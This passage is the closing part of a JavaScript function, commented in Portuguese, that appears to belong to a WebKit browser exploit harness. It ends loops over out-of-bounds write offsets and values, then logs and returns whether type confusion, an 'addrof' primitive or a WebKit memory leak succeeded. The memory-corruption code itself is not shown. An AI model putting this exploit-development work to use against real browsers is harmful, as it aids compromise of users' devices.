        } // Fim do loop OOB_WRITE_VALUES_R43L
        await PAUSE_S3(150); // Pausa entre mudanças de offset
    } // Fim do loop CRITICAL_WRITE_OFFSETS_R43L

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed ---`, "test", FNAME_CURRENT_TEST_BASE);
    if (best_result_for_runner.oob_params_of_best_result) {
        logS3(`Melhor resultado obtido com Offset: ${best_result_for_runner.oob_params_of_best_result.offset}, Valor: ${best_result_for_runner.oob_params_of_best_result.value}`, "info_emphasis", FNAME_CURRENT_TEST_BASE);
    } else {
        logS3(`Nenhum resultado de sucesso ou erro de referência foi encontrado em todas as iterações. Verifique os logs.`, "critical", FNAME_CURRENT_TEST_BASE);
    }
    logS3(`Best/Final result (R43L MassiveSR): ${JSON.stringify(best_result_for_runner, null, 2)}`, "debug", FNAME_CURRENT_TEST_BASE);

    // Definir título final com base no melhor resultado geral
    let finalDocTitle = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT} Final: No Success SR`;
    if (best_result_for_runner.webkit_leak_result.success) finalDocTitle = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT} Final: WebKitLeak OK! SR`;
    else if (best_result_for_runner.addrof_result.success) finalDocTitle = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT} Final: Addrof OK SR`;
    else if (best_result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe) finalDocTitle = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT} Final: TC OK SR`;
    else if (best_result_for_runner.errorOccurred) finalDocTitle = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT} Final: Error - ${best_result_for_runner.errorOccurred} SR`;
    document.title = finalDocTitle;

    return {
        errorOccurred: best_result_for_runner.errorOccurred,
        tc_probe_details: best_result_for_runner.tc_probe_details,
        stringifyResult: best_result_for_runner.stringifyResult,
        addrof_result: best_result_for_runner.addrof_result,
        webkit_leak_result: best_result_for_runner.webkit_leak_result,
        iteration_results_summary: iteration_results_summary,
        total_probe_calls_last_iter: final_probe_call_count_for_report,
        oob_params_of_best_result: best_result_for_runner.oob_params_of_best_result,
        heisenbug_on_M2_in_best_result: best_result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe
    };
}
